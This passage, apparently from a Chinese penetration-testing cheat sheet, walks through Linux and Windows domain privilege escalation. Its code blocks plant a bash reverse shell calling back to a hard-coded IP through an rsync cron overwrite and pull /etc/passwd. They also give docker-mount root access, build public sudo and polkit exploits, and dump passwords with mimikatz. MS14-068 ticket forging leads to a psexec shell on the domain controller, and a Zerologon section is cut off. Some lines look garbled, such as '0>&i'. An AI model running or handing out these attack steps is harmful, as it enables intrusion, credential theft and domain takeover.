&lt;p&gt;java8 -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar&lt;/p&gt;
&lt;p&gt;综合漏洞利用 (包含各数据库) &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xpcXVua2l0L0xpcXVuS2l0Xw==&#34;&gt;https://github.com/Liqunkit/LiqunKit_&lt;/span&gt; LiqunKit&lt;/p&gt;
&lt;p&gt;mssql 利用工具：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL1NoYXJwU1FMVG9vbHM=&#34;&gt;https://github.com/uknowsec/SharpSQLTools&lt;/span&gt; SharpSQLTools&lt;/p&gt;
&lt;p&gt;通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向移动 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrYXJyb3dzZWMvbXNzcWxwcm94eQ==&#34;&gt;https://github.com/blackarrowsec/mssqlproxy&lt;/span&gt; mssqlproxy&lt;/p&gt;
&lt;p&gt;ODAT：Oracle 数据库攻击工具 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3F1ZW50aW5oYXJkeS9vZGF0&#34;&gt;https://github.com/quentinhardy/odat&lt;/span&gt; ODAT&lt;/p&gt;
&lt;h4 id=&#34;rsync-未授权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rsync-未授权&#34;&gt;#&lt;/a&gt; rsync 未授权&lt;/h4&gt;
&lt;p&gt;Rsync 是 linux 下一款数据备份工具，默认开启 873 端口，借助 Linux 默认计划任务调用 /etc/cron.hourly，利用 rsync 连接覆盖。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建一个nc文件，内容如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/47.94.236.117/3333 0&amp;gt;&amp;amp;i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;赋予执行权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x nc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上传文件覆盖定时任务目录下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync -av nc rsync://47.94.236.117:873/src/etc/cron.hourly&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rsync -av rsync://47.94.236.117:873/src/etc/passwd ./&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;进行nc 监听相应的端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvnp 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;docker-组挂载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker-组挂载&#34;&gt;#&lt;/a&gt; docker 组挂载&lt;/h4&gt;
&lt;p&gt;普通用户在 docker 组，利用 docker 服务启动镜像挂载目录，从而来访问 root 目录、etc 目录等敏感文件来进行权限提升。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建用户归类目录，添加到docker组&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;useradd -d /home/test -m test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;passwd test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usermod -G docker test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;newgrp docker&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;从Docker上面下载alpine镜像，然后运行，-v将容器外部的目录/root挂载到容器内部/mnt，使用-it参数进入容器shell。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run -v /root:/mnt -it alpine&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;sudo-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudo-提权&#34;&gt;#&lt;/a&gt; sudo 提权&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;sudo: 版本在1.8.2-1.8.31p2 或者 1.0-1.5p1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/blasty/CVE-2021-3156.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd CVE-2021-3156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make &amp;amp;&amp;amp; chmod a+x sudo-hax-me-a-sandwich&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./sudo-hax-me-a-sandwich 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;polkit-漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#polkit-漏洞&#34;&gt;#&lt;/a&gt; polkit 漏洞&lt;/h4&gt;
&lt;p&gt;漏洞影响 2009 年 5 月至今的所有 polkit 版本，由于 polkit 是系统预装工具，所有存在 polkit 的 linux 系统均受影响，只要存在 polkit 且没有打补丁就可以提权。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;判断是否存在&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dpkg -l policykit-1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rpm -q policykit-1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;漏洞利用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/berdav/CVE-2021-4034.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd CVE-2021-4034/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make &amp;amp;&amp;amp; ./cve-2021-4034&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;域控提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域控提权&#34;&gt;#&lt;/a&gt; 域控提权&lt;/h3&gt;
&lt;h4 id=&#34;cve-2014-6324&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2014-6324&#34;&gt;#&lt;/a&gt; CVE-2014-6324&lt;/h4&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmVpemlhbnF1YW4vcC8xMTc2MDU2NC5odG1s&#34;&gt;https://www.cnblogs.com/feizianquan/p/11760564.html&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前提条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要域用户账号密码 + 一台主机的管理员权限 + 域控没有打 MS14-068 的补丁 (KB3011780)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工具下载&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Ms14-068.exe:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/abatchy17/WindowsExploits/tree/master/MS14- 068&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;PSexec:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;mimikatz:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/gentilkiwi/mimikatz/releases&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 如果当前用户为域用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;得到域成员用户名和 sid 号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;whoami /user &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;指定要同步时钟的域，可以查看域名称&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net time /domain &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 如果当前用户是普通用户，利用管理员身份启动 mimikatz 利用下列命令获取域用户 sid 和域控主机名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;权限提升&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;privilege::debug &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;抓取密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sekurlsa::logonPasswords &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 利用 ms14-068.exe 工具生成伪造的 kerberos 协议认证证书&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器 地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ms14-068.exe -u mary@god.org -p admin!@#45 -s S-1-5-21-1218902331- 2157346161-1782232778-1124 -d OWA2010CN-God.god.org&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;d. 利用 mimikatz.exe 将证书写入，从而提升为域管理员&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;清除当前会话&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kerberos::purge &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;导入由 ms14-068.exe 生成的证书 名字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kerberos::ptc &amp;quot;TGT_test02@test.lab.ccache&amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看与域控是否建立了联系&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kerberos::list &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;e. 连接域控，获取域控的 shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;测试连接是否成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\OWA2010CN-God.god.org\C$ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用 PsExec.exe 以管理员权限运行连接域控&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;psexec \\OWA2010CN-God.god.org cmd &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cve-2020-1472&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2020-1472&#34;&gt;#&lt;/a&gt; CVE-2020-1472&lt;/h4&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODM3NDgz&#34;&gt;https://cloud.tencent.com/developer/article/1837483&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前提条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CVE-2020-1472 是继 MS17010 之后好用的 NetLogon 特权域控提权漏洞， 只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞。该漏洞不要求当前计算机在域内，也不要求当前计算机操作系统为 Windows.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工具下载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下载 poc:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyYUJWL0NWRS0yMDIwLTE0NzI=&#34;&gt;https://github.com/SecuraBV/CVE-2020-1472&lt;/span&gt;&lt;br&gt;
 下载 exp:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=&#34;&gt;https://github.com/dirkjanm/CVE-2020-1472&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞利用&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 获取目标计算机名，进行漏洞检测&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取目标计算机名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nbtscan -v -h 192.168.3.21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta 